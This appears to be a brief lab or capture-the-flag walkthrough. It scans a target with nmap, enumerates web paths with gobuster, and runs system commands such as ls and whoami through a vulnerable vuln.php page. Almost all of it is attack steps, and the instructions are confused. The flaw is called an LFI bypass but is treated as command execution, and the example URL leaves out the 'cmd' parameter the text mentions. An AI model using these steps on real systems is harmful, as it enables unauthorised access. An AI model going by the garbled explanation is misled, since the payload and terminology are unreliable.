#now you can use the nmap for scan the target and you can get ssh and http port 
nmap -p 22,80 <target ip>

#now just enumarate the files and directories on http
gobuster dir -u http://<targetip>/ -w common.txt -x html,php,txt

#now you got a file extension called vuln.php 
#now here we get a LFI bypass method 

#Use a web browser or Burp Suite to pass a system command through the cmd parameter, such as ls or whoami
http://<targetip>/vuln.php?ls

#You should see a list of the files and directories on the server, which means the PHP vulnerability is successfully exploited
